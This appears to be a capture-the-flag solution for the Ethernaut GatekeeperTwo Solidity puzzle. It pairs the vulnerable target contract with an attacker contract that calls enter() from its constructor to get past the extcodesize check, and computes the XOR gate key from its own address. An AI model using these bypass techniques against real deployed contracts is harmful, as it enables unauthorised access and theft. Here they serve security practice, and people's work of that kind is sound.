// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/GatekeeperTwo.sol';

contract HackGatekeeperTwo {
    GatekeeperTwo originalContract;
    // XOR operator ^ is easily reversible
    // We need to use the previous result as the second value so we obtain the previous second value
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

    // To pass the second gate, we need to our address not to have any code
    // When we're creating the contract, there's still no code in the contract's address
    // Executing the function into the contractor is out way to bypass the second gate
    constructor(address _contract) {
        originalContract = GatekeeperTwo(_contract);
        originalContract.enter(key);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}